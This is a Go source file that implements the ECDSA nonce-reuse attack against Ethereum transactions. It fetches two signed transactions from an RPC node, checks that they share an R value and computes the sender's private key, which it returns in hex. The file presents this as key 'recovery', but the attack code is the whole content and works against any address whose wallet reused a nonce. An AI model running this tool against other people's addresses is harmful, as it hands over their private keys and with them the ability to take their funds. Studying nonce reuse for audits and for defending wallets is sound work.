package recovery

import (
	"context"
	"encoding/hex"
	"errors"
	"fmt"
	"math/big"
	"strings"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

var (
	// secp256k1 curve order
	secp256k1N, _ = new(big.Int).SetString("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141", 16)
)

// RecoveredKey holds information about a recovered private key
type RecoveredKey struct {
	Address    string `json:"address"`
	PrivateKey string `json:"private_key"`
	Chain      string `json:"chain"`
	RValue     string `json:"r_value"`
	TxHash1    string `json:"tx_hash_1"`
	TxHash2    string `json:"tx_hash_2"`
}

// TxSignature holds the signature components and signing hash of a transaction
type TxSignature struct {
	TxHash      string
	SigningHash []byte
	R           *big.Int
	S           *big.Int
	V           *big.Int
}

// RecoverPrivateKey attempts to recover a private key from two transactions
// that share the same R value (nonce reuse)
func RecoverPrivateKey(ctx context.Context, rpcURL string, txHash1, txHash2 string) (*RecoveredKey, error) {
	client, err := ethclient.DialContext(ctx, rpcURL)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to RPC: %w", err)
	}
	defer client.Close()

	// Get both transactions
	sig1, from1, err := getTxSignature(ctx, client, txHash1)
	if err != nil {
		return nil, fmt.Errorf("failed to get tx1: %w", err)
	}

	sig2, from2, err := getTxSignature(ctx, client, txHash2)
	if err != nil {
		return nil, fmt.Errorf("failed to get tx2: %w", err)
	}

	// Verify same sender
	if from1 != from2 {
		return nil, errors.New("transactions have different senders")
	}

	// Verify same R value
	if sig1.R.Cmp(sig2.R) != 0 {
		return nil, errors.New("transactions have different R values")
	}

	// Verify different S values (otherwise same signature)
	if sig1.S.Cmp(sig2.S) == 0 {
		return nil, errors.New("transactions have identical signatures")
	}

	// Recover the private key using the nonce reuse attack
	// k = (z1 - z2) / (s1 - s2) mod n
	// d = (s1 * k - z1) / r mod n

	z1 := new(big.Int).SetBytes(sig1.SigningHash)
	z2 := new(big.Int).SetBytes(sig2.SigningHash)
	s1 := sig1.S
	s2 := sig2.S
	r := sig1.R

	// Calculate k = (z1 - z2) * (s1 - s2)^(-1) mod n
	zDiff := new(big.Int).Sub(z1, z2)
	zDiff.Mod(zDiff, secp256k1N)

	sDiff := new(big.Int).Sub(s1, s2)
	sDiff.Mod(sDiff, secp256k1N)

	sDiffInv := new(big.Int).ModInverse(sDiff, secp256k1N)
	if sDiffInv == nil {
		return nil, errors.New("failed to compute modular inverse of s difference")
	}

	k := new(big.Int).Mul(zDiff, sDiffInv)
	k.Mod(k, secp256k1N)

	// Calculate d = (s1 * k - z1) * r^(-1) mod n
	rInv := new(big.Int).ModInverse(r, secp256k1N)
	if rInv == nil {
		return nil, errors.New("failed to compute modular inverse of r")
	}

	d := new(big.Int).Mul(s1, k)
	d.Sub(d, z1)
	d.Mul(d, rInv)
	d.Mod(d, secp256k1N)

	// Handle negative results
	if d.Sign() < 0 {
		d.Add(d, secp256k1N)
	}

	// Verify the recovered key
	privKey, err := crypto.ToECDSA(d.Bytes())
	if err != nil {
		// Try with negated k (there are two possible k values)
		k.Sub(secp256k1N, k)
		d = new(big.Int).Mul(s1, k)
		d.Sub(d, z1)
		d.Mul(d, rInv)
		d.Mod(d, secp256k1N)
		if d.Sign() < 0 {
			d.Add(d, secp256k1N)
		}
		privKey, err = crypto.ToECDSA(d.Bytes())
		if err != nil {
			return nil, fmt.Errorf("failed to create private key: %w", err)
		}
	}

	// Verify the address matches
	recoveredAddr := crypto.PubkeyToAddress(privKey.PublicKey)
	if !strings.EqualFold(recoveredAddr.Hex(), from1) {
		// Try with negated k
		k.Sub(secp256k1N, k)
		d = new(big.Int).Mul(s1, k)
		d.Sub(d, z1)
		d.Mul(d, rInv)
		d.Mod(d, secp256k1N)
		if d.Sign() < 0 {
			d.Add(d, secp256k1N)
		}

		// Pad to 32 bytes
		dBytes := make([]byte, 32)
		dBytesTmp := d.Bytes()
		copy(dBytes[32-len(dBytesTmp):], dBytesTmp)

		privKey, err = crypto.ToECDSA(dBytes)
		if err != nil {
			return nil, fmt.Errorf("failed to create private key (attempt 2): %w", err)
		}

		recoveredAddr = crypto.PubkeyToAddress(privKey.PublicKey)
		if !strings.EqualFold(recoveredAddr.Hex(), from1) {
			return nil, fmt.Errorf("recovered address %s does not match sender %s", recoveredAddr.Hex(), from1)
		}
	}

	// Format private key as hex
	privKeyBytes := crypto.FromECDSA(privKey)
	privKeyHex := hex.EncodeToString(privKeyBytes)

	return &RecoveredKey{
		Address:    from1,
		PrivateKey: "0x" + privKeyHex,
		RValue:     "0x" + sig1.R.Text(16),
		TxHash1:    txHash1,
		TxHash2:    txHash2,
	}, nil
}

// getTxSignature fetches a transaction and extracts its signature components
func getTxSignature(ctx context.Context, client *ethclient.Client, txHashStr string) (*TxSignature, string, error) {
	txHash := common.HexToHash(txHashStr)

	tx, _, err := client.TransactionByHash(ctx, txHash)
	if err != nil {
		return nil, "", fmt.Errorf("failed to get transaction: %w", err)
	}

	// Get the signer
	chainID, err := client.ChainID(ctx)
	if err != nil {
		return nil, "", fmt.Errorf("failed to get chain ID: %w", err)
	}

	signer := types.LatestSignerForChainID(chainID)
	from, err := types.Sender(signer, tx)
	if err != nil {
		return nil, "", fmt.Errorf("failed to get sender: %w", err)
	}

	// Get signature components
	v, r, s := tx.RawSignatureValues()

	// Get the signing hash
	signingHash := signer.Hash(tx)

	return &TxSignature{
		TxHash:      txHashStr,
		SigningHash: signingHash.Bytes(),
		R:           r,
		S:           s,
		V:           v,
	}, from.Hex(), nil
}

// VerifyPrivateKey verifies that a private key corresponds to an address
func VerifyPrivateKey(privateKeyHex, expectedAddress string) bool {
	privKeyHex := strings.TrimPrefix(privateKeyHex, "0x")
	privKeyBytes, err := hex.DecodeString(privKeyHex)
	if err != nil {
		return false
	}

	privKey, err := crypto.ToECDSA(privKeyBytes)
	if err != nil {
		return false
	}

	addr := crypto.PubkeyToAddress(privKey.PublicKey)
	return strings.EqualFold(addr.Hex(), expectedAddress)
}

// GetPublicKey derives the public key from a private key
func GetPublicKey(privateKeyHex string) (string, error) {
	privKeyHex := strings.TrimPrefix(privateKeyHex, "0x")
	privKeyBytes, err := hex.DecodeString(privKeyHex)
	if err != nil {
		return "", err
	}

	privKey, err := crypto.ToECDSA(privKeyBytes)
	if err != nil {
		return "", err
	}

	pubKeyBytes := crypto.FromECDSAPub(&privKey.PublicKey)
	return "0x" + hex.EncodeToString(pubKeyBytes), nil
}

// GetAddressFromPrivateKey derives the address from a private key
func GetAddressFromPrivateKey(privateKeyHex string) (string, error) {
	privKeyHex := strings.TrimPrefix(privateKeyHex, "0x")
	privKeyBytes, err := hex.DecodeString(privKeyHex)
	if err != nil {
		return "", err
	}

	privKey, err := crypto.ToECDSA(privKeyBytes)
	if err != nil {
		return "", err
	}

	addr := crypto.PubkeyToAddress(privKey.PublicKey)
	return addr.Hex(), nil
}
